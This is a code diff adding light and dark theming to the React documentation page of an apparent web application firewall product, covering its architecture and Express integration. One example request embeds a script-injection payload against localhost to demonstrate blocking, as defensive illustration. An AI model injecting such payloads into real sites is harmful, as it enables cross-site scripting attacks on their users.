@@ -88,7 +88,8 @@ function CodeBlock({ code, language = 'javascript' }) {
       overflow: 'hidden',
       margin: '18px 0',
       background: '#070b14',
-      border: '1px solid #1e293b'
+      border: '1px solid #1e293b',
+      boxShadow: '0 4px 15px rgba(0,0,0,0.2)'
     }}>
       <div style={{
         display: 'flex',
@@ -98,7 +99,7 @@ function CodeBlock({ code, language = 'javascript' }) {
         background: '#04070e',
         borderBottom: '1px solid #1e293b',
         fontSize: '11px',
-        color: '#64748b',
+        color: '#94a3b8',
         fontFamily: 'monospace'
       }}>
         <span>{language.toUpperCase()}</span>
@@ -107,7 +108,7 @@ function CodeBlock({ code, language = 'javascript' }) {
           style={{
             background: 'none',
             border: 'none',
-            color: copied ? '#10b981' : '#94a3b8',
+            color: copied ? '#10b981' : '#cbd5e1',
             cursor: 'pointer',
             fontSize: '11px',
             display: 'flex',
@@ -161,6 +162,7 @@ function MethodBadge({ method }) {
 }
 
 export default function Docs() {
+  const { dark } = useTheme()
   const [activeSection, setActiveSection] = useState('intro')
   const [searchFilter, setSearchFilter] = useState('')
 
@@ -175,13 +177,49 @@ export default function Docs() {
       .filter(group => group.items.length > 0)
   }, [searchFilter])
 
+  // Design Tokens for Crisp Light and Cyber Dark Modes
+  const t = {
+    bg: dark ? '#070b14' : '#f8fafc',
+    sidebarBg: dark ? '#0a0e1a' : '#ffffff',
+    sidebarBorder: dark ? '1px solid #1e293b' : '1px solid #e2e8f0',
+    heading: dark ? '#ffffff' : '#0f172a',
+    subheading: dark ? '#f8fafc' : '#1e293b',
+    body: dark ? '#cbd5e1' : '#334155',
+    muted: dark ? '#94a3b8' : '#64748b',
+    cardBg: dark ? '#0c1222' : '#ffffff',
+    cardBgAlt: dark ? '#0a0f1d' : '#ffffff',
+    cardBorder: dark ? '1px solid #1e293b' : '1px solid #e2e8f0',
+    cardBorderAlt: dark ? '1px solid #334155' : '1px solid #cbd5e1',
+    cardShadow: dark ? 'none' : '0 4px 20px -2px rgba(0,0,0,0.05)',
+    cardGrad: dark
+      ? 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))'
+      : '#ffffff',
+    searchBg: dark ? '#070b14' : '#f1f5f9',
+    searchBorder: dark ? '1px solid #1e293b' : '1px solid #cbd5e1',
+    searchText: dark ? '#e2e8f0' : '#0f172a',
+    tableHeadBg: dark ? '#0c1222' : '#f1f5f9',
+    tableBorder: dark ? '#1e293b' : '#e2e8f0',
+    accentText: dark ? '#38bdf8' : '#0284c7',
+    primaryGrad: 'linear-gradient(135deg, #2563eb, #7c3aed)'
+  }
+
   return (
     <div style={{
       minHeight: '100vh',
-      background: '#070b14',
-      color: '#f1f5f9',
+      background: t.bg,
+      color: t.body,
       fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
     }}>
+      <style>{`
+        .doc-inline-code {
+          background: ${dark ? 'rgba(255,255,255,0.08)' : '#e2e8f0'};
+          color: ${dark ? '#38bdf8' : '#0284c7'};
+          padding: 2px 6px;
+          border-radius: 4px;
+          font-family: 'SF Mono', Monaco, monospace;
+          font-size: 0.9em;
+        }
+      `}</style>
       <PublicNavbar />
 
       <div style={{
@@ -194,8 +232,8 @@ export default function Docs() {
         <aside style={{
           width: '310px',
           flexShrink: 0,
-          borderRight: '1px solid #1e293b',
-          background: '#0a0e1a',
+          borderRight: t.sidebarBorder,
+          background: t.sidebarBg,
           padding: '28px 20px',
           position: 'sticky',
           top: '70px',
@@ -221,9 +259,9 @@ export default function Docs() {
                 width: '100%',
                 padding: '8px 12px 8px 34px',
                 borderRadius: '8px',
-                border: '1px solid #1e293b',
-                background: '#070b14',
-                color: '#e2e8f0',
+                border: t.searchBorder,
+                background: t.searchBg,
+                color: t.searchText,
                 fontSize: '13px',
                 outline: 'none'
               }}
@@ -237,7 +275,7 @@ export default function Docs() {
                 <div style={{
                   fontSize: '11px',
                   fontWeight: '700',
-                  color: '#64748b',
+                  color: t.muted,
                   textTransform: 'uppercase',
                   letterSpacing: '0.05em',
                   marginBottom: '8px',
@@ -254,8 +292,8 @@ export default function Docs() {
                         padding: '7px 10px',
                         borderRadius: '6px',
                         border: 'none',
-                        background: activeSection === item.id ? 'rgba(37,99,235,0.15)' : 'transparent',
-                        color: activeSection === item.id ? '#60a5fa' : '#94a3b8',
+                        background: activeSection === item.id ? (dark ? 'rgba(37,99,235,0.15)' : 'rgba(37,99,235,0.1)') : 'transparent',
+                        color: activeSection === item.id ? (dark ? '#60a5fa' : '#2563eb') : t.muted,
                         fontWeight: activeSection === item.id ? '700' : '500',
                         fontSize: '13px',
                         cursor: 'pointer',
@@ -266,7 +304,7 @@ export default function Docs() {
                         transition: 'all 0.15s'
                       }}
                     >
-                      <i className={`fas ${item.icon}`} style={{ width: '16px', textAlign: 'center', color: activeSection === item.id ? '#38bdf8' : '#64748b' }}></i>
+                      <i className={`fas ${item.icon}`} style={{ width: '16px', textAlign: 'center', color: activeSection === item.id ? (dark ? '#38bdf8' : '#2563eb') : '#64748b' }}></i>
                       {item.label}
                     </button>
                   ))}
@@ -287,7 +325,7 @@ export default function Docs() {
           <div style={{ fontSize: '13px', color: '#64748b', marginBottom: '14px', display: 'flex', alignItems: 'center', gap: '6px' }}>
             <span>Docs</span>
             <i className="fas fa-chevron-right" style={{ fontSize: '10px' }}></i>
-            <span style={{ color: '#38bdf8', fontWeight: '600' }}>
+            <span style={{ color: t.accentText, fontWeight: '600' }}>
               {docSections.flatMap(g => g.items).find(i => i.id === activeSection)?.label || 'Overview'}
             </span>
           </div>
@@ -295,8 +333,8 @@ export default function Docs() {
           {/* Section: Intro */}
           {activeSection === 'intro' && (
             <div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>What is MDefender Pro?</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>What is MDefender Pro?</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 <strong>MDefender Pro</strong> is an enterprise-grade, hybrid Web Application Firewall (WAF) and real-time API protection suite. It combines a deterministic catalog of <strong>2,000 verified WAF signature rules</strong> with a state-of-the-art <strong>Machine Learning model trained on 5.48M++ real-world attack vectors</strong> to safeguard applications against OWASP Top 10 vulnerabilities, zero-day payloads, and bot scrapers with sub-millisecond execution.
               </p>
 
@@ -306,29 +344,29 @@ export default function Docs() {
                 gap: '16px',
                 margin: '28px 0'
               }}>
-                <div style={{ padding: '22px', borderRadius: '10px', background: '#0c1222', border: '1px solid #1e293b' }}>
-                  <div style={{ color: '#38bdf8', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
+                <div style={{ padding: '22px', borderRadius: '10px', background: t.cardBg, border: t.cardBorder, boxShadow: t.cardShadow }}>
+                  <div style={{ color: t.accentText, fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
                     <i className="fas fa-microchip" style={{ marginRight: '6px' }}></i> 5,489,242+ Dataset ML Model
                   </div>
-                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0, lineHeight: '1.6' }}>
+                  <p style={{ fontSize: '13px', color: t.muted, margin: 0, lineHeight: '1.6' }}>
                     Trained across CSIC HTTP, CICIDS, and honeypot corpora using character n-gram TF-IDF vectorization.
                   </p>
                 </div>
 
-                <div style={{ padding: '22px', borderRadius: '10px', background: '#0c1222', border: '1px solid #1e293b' }}>
-                  <div style={{ color: '#60a5fa', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
+                <div style={{ padding: '22px', borderRadius: '10px', background: t.cardBg, border: t.cardBorder, boxShadow: t.cardShadow }}>
+                  <div style={{ color: dark ? '#60a5fa' : '#2563eb', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
                     <i className="fas fa-shield-halved" style={{ marginRight: '6px' }}></i> 2,000 WAF Rules
                   </div>
-                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0, lineHeight: '1.6' }}>
+                  <p style={{ fontSize: '13px', color: t.muted, margin: 0, lineHeight: '1.6' }}>
                     Exhaustive regex catalog covering SQLi, XSS, RCE, LFI, CMS exploits, and scanner bots.
                   </p>
                 </div>
 
-                <div style={{ padding: '22px', borderRadius: '10px', background: '#0c1222', border: '1px solid #1e293b' }}>
-                  <div style={{ color: '#10b981', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
+                <div style={{ padding: '22px', borderRadius: '10px', background: t.cardBg, border: t.cardBorder, boxShadow: t.cardShadow }}>
+                  <div style={{ color: '#059669', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
                     <i className="fas fa-bolt" style={{ marginRight: '6px' }}></i> &lt; 0.85ms Latency
                   </div>
-                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0, lineHeight: '1.6' }}>
+                  <p style={{ fontSize: '13px', color: t.muted, margin: 0, lineHeight: '1.6' }}>
                     Pre-compiled in-memory lookup table and low-overhead SGD inference guarantee zero application lag.
                   </p>
                 </div>
@@ -339,55 +377,56 @@ export default function Docs() {
           {/* Section: Hybrid Architecture */}
           {activeSection === 'hybrid-architecture' && (
             <div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Hybrid WAF + ML Architecture</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '20px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Hybrid WAF + ML Architecture</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '20px' }}>
                 MDefender employs a multi-tiered pipeline that executes deterministic rule checks alongside statistical machine learning classification:
               </p>
 
               <div style={{
-                background: '#0a0e1a',
-                border: '1px solid #1e293b',
+                background: t.cardBgAlt,
+                border: t.cardBorder,
                 borderRadius: '12px',
                 padding: '28px',
+                boxShadow: t.cardShadow,
                 margin: '24px 0'
               }}>
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>
                   <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.2)', color: '#60a5fa', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>1</span>
+                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.15)', color: '#2563eb', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>1</span>
                     <div>
-                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Request Extraction &amp; Recursive Normalization</strong>
-                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
+                      <strong style={{ fontSize: '15px', color: t.heading }}>Request Extraction &amp; Recursive Normalization</strong>
+                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                         Extracts URL path, query string, request headers (User-Agent, Referer, Cookies), and multipart/JSON body fields. Executes double URL unquoting to prevent multi-layered encoding evasion.
                       </p>
                     </div>
                   </div>
 
                   <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.2)', color: '#60a5fa', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>2</span>
+                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.15)', color: '#2563eb', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>2</span>
                     <div>
-                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Tier 1: 2,000 Compiled Regex Rules (0.12ms)</strong>
-                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
+                      <strong style={{ fontSize: '15px', color: t.heading }}>Tier 1: 2,000 Compiled Regex Rules (0.12ms)</strong>
+                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                         Evaluates pre-compiled regular expressions for known signatures. Also appends custom user-defined tenant rules dynamically.
                       </p>
                     </div>
                   </div>
 
                   <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(139,92,246,0.2)', color: '#c084fc', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>3</span>
+                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(139,92,246,0.15)', color: '#7c3aed', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>3</span>
                     <div>
-                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Tier 2: 5,489,242+ Dataset ML Inference Classifier (0.34ms)</strong>
-                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
+                      <strong style={{ fontSize: '15px', color: t.heading }}>Tier 2: 5,489,242+ Dataset ML Inference Classifier (0.34ms)</strong>
+                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                         Vectorizes text into character n-grams and evaluates against the trained linear SGD / logistic model, outputting probability confidence and attack category.
                       </p>
                     </div>
                   </div>
 
                   <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
-                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(16,185,129,0.2)', color: '#34d399', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>4</span>
+                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(16,185,129,0.15)', color: '#059669', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>4</span>
                     <div>
-                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Decision Engine &amp; Threat Termination</strong>
-                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
-                        If confidence exceeds threshold or a rule is matched, the engine returns an immediate <code>HTTP 403 Forbidden</code>, flags the attacking IP, and streams live telemetry to the user dashboard.
+                      <strong style={{ fontSize: '15px', color: t.heading }}>Decision Engine &amp; Threat Termination</strong>
+                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
+                        If confidence exceeds threshold or a rule is matched, the engine returns an immediate <code className="doc-inline-code">HTTP 403 Forbidden</code>, flags the attacking IP, and streams live telemetry to the user dashboard.
                       </p>
                     </div>
                   </div>
@@ -405,7 +444,7 @@ export default function Docs() {
                   borderRadius: '20px',
                   background: 'rgba(56, 189, 248, 0.15)',
                   border: '1px solid rgba(56, 189, 248, 0.3)',
-                  color: '#38bdf8',
+                  color: t.accentText,
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Integration Guide</span>
@@ -414,85 +453,88 @@ export default function Docs() {
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Zero Config &bull; Bundled 403 Page</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>
                 How to Connect Your Website with MDefender
               </h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '28px' }}>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '28px' }}>
                 Learn how to integrate MDefender Pro into any web application or backend. When you install our package, everything &mdash; including the high-speed 403 Cyber Block Page &mdash; is bundled and ready to go immediately upon adding your API key.
               </p>
 
               {/* Step 1: Install Package */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-1" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-1" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Install the NPM Package
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                   Run the following command in your backend project directory:
                 </p>
                 <CodeBlock language="bash" code={`npm install mdefender-pro`} />
                 <div style={{
-                  background: 'rgba(56, 189, 248, 0.08)',
-                  border: '1px solid rgba(56, 189, 248, 0.25)',
+                  background: dark ? 'rgba(56, 189, 248, 0.08)' : 'rgba(2, 132, 199, 0.08)',
+                  border: dark ? '1px solid rgba(56, 189, 248, 0.25)' : '1px solid rgba(2, 132, 199, 0.25)',
                   borderRadius: '10px',
                   padding: '14px 16px',
                   marginTop: '14px'
                 }}>
-                  <p style={{ margin: 0, fontSize: '12.5px', color: '#93c5fd', lineHeight: '1.6' }}>
-                    <i className="fa-solid fa-shield-halved" style={{ marginRight: '6px', color: '#38bdf8' }}></i>
-                    <strong>Bundled Block Page:</strong> The MDefender-Pro AI Corporate 403 Block Page is automatically installed inside <code>mdefender-pro</code> with real-time GeoIP, country flags, and incident tracking. You do <strong>NOT</strong> need to create or host an external HTML file!
+                  <p style={{ margin: 0, fontSize: '12.5px', color: dark ? '#93c5fd' : '#0369a1', lineHeight: '1.6' }}>
+                    <i className="fa-solid fa-shield-halved" style={{ marginRight: '6px', color: t.accentText }}></i>
+                    <strong>Bundled Block Page:</strong> The MDefender-Pro AI Corporate 403 Block Page is automatically installed inside <code className="doc-inline-code">mdefender-pro</code> with real-time GeoIP, country flags, and incident tracking. You do <strong>NOT</strong> need to create or host an external HTML file!
                   </p>
                 </div>
               </div>
 
               {/* Step 2: Get API Key */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-2" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-2" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Get Your Website API Key
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', margin: '0 0 12px' }}>
-                  Go to <Link to="/user/settings" style={{ color: '#38bdf8', fontWeight: '600' }}>Settings</Link> or <Link to="/user/websites" style={{ color: '#38bdf8', fontWeight: '600' }}>Websites</Link> in your MDefender dashboard to copy your active API Key (e.g. <code>Ix2TtXbbBHJol...</code>).
+                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', margin: '0 0 12px' }}>
+                  Go to <Link to="/user/settings" style={{ color: t.accentText, fontWeight: '600' }}>Settings</Link> or <Link to="/user/websites" style={{ color: t.accentText, fontWeight: '600' }}>Websites</Link> in your MDefender dashboard to copy your active API Key (e.g. <code className="doc-inline-code">Ix2TtXbbBHJol...</code>).
                 </p>
               </div>
 
               {/* Step 3: Configure Your Application */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-3" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-3" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Configure Your Application
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                   You can configure MDefender in either of two easy ways:
                 </p>
 
                 <div style={{ marginTop: '14px' }}>
-                  <div style={{ fontSize: '13px', fontWeight: '700', color: '#38bdf8', marginBottom: '6px' }}>
-                    Option A: Config File (<code>mdefender.config.js</code>)
+                  <div style={{ fontSize: '13px', fontWeight: '700', color: t.accentText, marginBottom: '6px' }}>
+                    Option A: Config File (<code className="doc-inline-code">mdefender.config.js</code>)
                   </div>
                   <CodeBlock
                     language="javascript"
@@ -508,7 +550,7 @@ module.exports = {
                 </div>
 
                 <div style={{ marginTop: '18px' }}>
-                  <div style={{ fontSize: '13px', fontWeight: '700', color: '#38bdf8', marginBottom: '6px' }}>
+                  <div style={{ fontSize: '13px', fontWeight: '700', color: t.accentText, marginBottom: '6px' }}>
                     Option B: Pass Directly in Code
                   </div>
                   <CodeBlock
@@ -527,18 +569,19 @@ app.use(mdefender({
 
               {/* Step 4: Attach Middleware in Express */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-4" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-4" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   Attach Middleware in Express
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
-                  Make sure <code>{"app.use(mdefender())"}</code> is placed after body parsers and before route endpoints:
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
+                  Make sure <code className="doc-inline-code">app.use(mdefender())</code> is placed after body parsers and before route endpoints:
                 </p>
                 <CodeBlock
                   language="javascript"
@@ -564,38 +607,39 @@ app.listen(5000, () => console.log('Bookstore Server running with MDefender Pro!
 
               {/* Understanding Frontend vs Backend in Network Tab */}
               <div style={{
-                background: '#0a0e1a',
-                border: '1px solid #1e293b',
+                background: t.cardBgAlt,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '14px' }}>
-                  <i className="fa-solid fa-network-wired" style={{ color: '#a78bfa', marginRight: '8px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '14px' }}>
+                  <i className="fa-solid fa-network-wired" style={{ color: '#7c3aed', marginRight: '8px' }}></i>
                   Understanding Frontend vs Backend in Network Tab
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '16px', lineHeight: '1.6' }}>
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '16px', lineHeight: '1.6' }}>
                   When building a modern full-stack web app (e.g. React/Vite on port 5173/5174 and Express on port 4000/5000):
                 </p>
 
                 <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
-                  <div style={{ background: '#0f172a', padding: '16px', borderRadius: '10px', border: '1px solid #334155' }}>
-                    <h4 style={{ color: '#10b981', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
+                  <div style={{ background: dark ? '#0f172a' : '#f8fafc', padding: '16px', borderRadius: '10px', border: t.cardBorder }}>
+                    <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
                       <i className="fa-solid fa-server" style={{ marginRight: '6px' }}></i>
                       Backend API Requests (Port 4000 / 5000)
                     </h4>
-                    <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
-                      When a malicious request is sent to your API (e.g. <code>http://localhost:5000/api/books?id=&lt;script&gt;alert(1)&lt;/script&gt;</code>), the WAF intercepts it, stops execution, returns <strong>403 Forbidden</strong>, and renders the 403 Cyber Block Page.
+                    <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
+                      When a malicious request is sent to your API (e.g. <code className="doc-inline-code">http://localhost:5000/api/books?id=&lt;script&gt;alert(1)&lt;/script&gt;</code>), the WAF intercepts it, stops execution, returns <strong>403 Forbidden</strong>, and renders the 403 Cyber Block Page.
                     </p>
                   </div>
 
-                  <div style={{ background: '#0f172a', padding: '16px', borderRadius: '10px', border: '1px solid #334155' }}>
-                    <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
+                  <div style={{ background: dark ? '#0f172a' : '#f8fafc', padding: '16px', borderRadius: '10px', border: t.cardBorder }}>
+                    <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
                       <i className="fab fa-react" style={{ marginRight: '6px' }}></i>
                       Frontend Dev Server (Port 5173 / 5174)
                     </h4>
-                    <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
-                      Visiting the static URL loads the client Single-Page Application bundle from Vite. With <code>initWaf</code> in <code>main.jsx</code> and <code>mdefenderVite</code> in <code>vite.config.js</code>, hostile exploits in URL queries or client state are blocked instantly with the bundled 403 Block Page.
+                    <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
+                      Visiting the static URL loads the client Single-Page Application bundle from Vite. With <code className="doc-inline-code">initWaf</code> in <code className="doc-inline-code">main.jsx</code> and <code className="doc-inline-code">mdefenderVite</code> in <code className="doc-inline-code">vite.config.js</code>, hostile exploits in URL queries or client state are blocked instantly with the bundled 403 Block Page.
                     </p>
                   </div>
                 </div>
@@ -603,16 +647,17 @@ app.listen(5000, () => console.log('Bookstore Server running with MDefender Pro!
 
               {/* Test and Verify Active Protection */}
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
-                padding: '24px'
+                padding: '24px',
+                boxShadow: t.cardShadow
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-flask" style={{ color: '#10b981', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-flask" style={{ color: '#059669', marginRight: '10px' }}></i>
                   Test and Verify Active Protection
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
+                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                   Execute these test requests in your terminal or browser:
                 </p>
                 <CodeBlock
@@ -634,23 +679,24 @@ curl -i "http://localhost:5000/api/books"`}
           {activeSection === 'ml-overview' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>AI Core</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>5,489,242+ Training Samples</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>AI Core</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>5,489,242+ Training Samples</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>The 5,489,242+ Dataset Machine Learning Core</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>The 5,489,242+ Dataset Machine Learning Core</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
